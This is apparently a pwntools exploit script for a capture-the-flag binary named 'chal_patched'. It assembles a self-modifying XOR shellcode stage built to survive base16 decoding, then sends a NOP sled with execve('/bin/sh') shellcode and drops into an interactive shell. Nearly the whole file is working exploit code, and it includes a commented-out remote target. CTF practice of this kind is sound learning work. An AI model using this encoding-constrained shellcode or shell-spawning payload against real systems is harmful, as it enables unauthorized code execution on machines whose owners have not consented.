from pwn import *

target = process('./chal_patched')

pid = gdb.attach(target, "\nb *main+148\n set disassembly-flavor intel\ncontinue")
#target = remote('0.cloud.chals.io', 23261)
context.clear(arch='amd64')
import base64

#Write in the first H
shellcode = asm('''
xor al, 0x33; 
xor dh, BYTE PTR [rax];
xor al, 0x33;
xor al, 0x31;
xor dh, BYTE PTR [rax];
xor al, 0x41;
xor BYTE PTR [rax], dh;
''')
#Write in the second H
shellcode += asm('''
xor al, 0x33;
xor al, 0x30;
xor BYTE PTR [rax], dh;
''')
#Writing the 0xff:
#Remember dh = 0x9 and al = 0x73 at this point.
shellcode += asm('''
xor al, 0x42;
xor dh, BYTE PTR [rax];
xor al, 0x43;
xor BYTE PTR [rax], bh;
xor BYTE PTR [rax], dh; 
''')
#Writing the 0xc0:
#Remember dh = 0x39 and al = 0x72 at this point.
shellcode += asm('''
xor al, 0x30;
xor al, 0x37;
xor BYTE PTR [rax], bh;
''')
#Writing the 0x0f to 0x76:
#Remember dh = 0x39 and al = 0x75 at this point.
shellcode += asm('''
xor al, 0x30;
xor al, 0x33;
xor BYTE PTR [rax], dh;
''')
#Writing the 0x05 to 0x77:
#Remember dh = 0x39 and al = 0x75 at this point.

print(len(shellcode))
shellcode += asm('xor BYTE PTR [rsi], dh;') * ((0x30 - len(shellcode)) // 2)
shellcode += asm('''
xor dh, BYTE PTR [rax]
xor al, 0x39;
''')

shellcode += asm('''
xor al, 0x39;
xor al, 0x30;
xor al, 0x31;
xor BYTE PTR [rax], dh;
''')



payload = base64.b16decode(shellcode + asm('xor BYTE PTR [rsi], dh;') * ((0x70 - len(shellcode)) // 2) + b'A' + b'12' + b'A' + b'14' + b'63') 

print(payload)
target.sendline(payload)

payload2 = b'\x90' * 0x80
payload2 += asm('''
lea rdi, [rip+0x30];
xor rsi, rsi;
xor rdx, rdx;
mov rax, 59;
syscall;
''')
payload2 += b'\x90' * (0x30 - len(payload2) + 0x80 + 7) + b'/bin/sh\x00'

target.sendline(payload2)
target.interactive()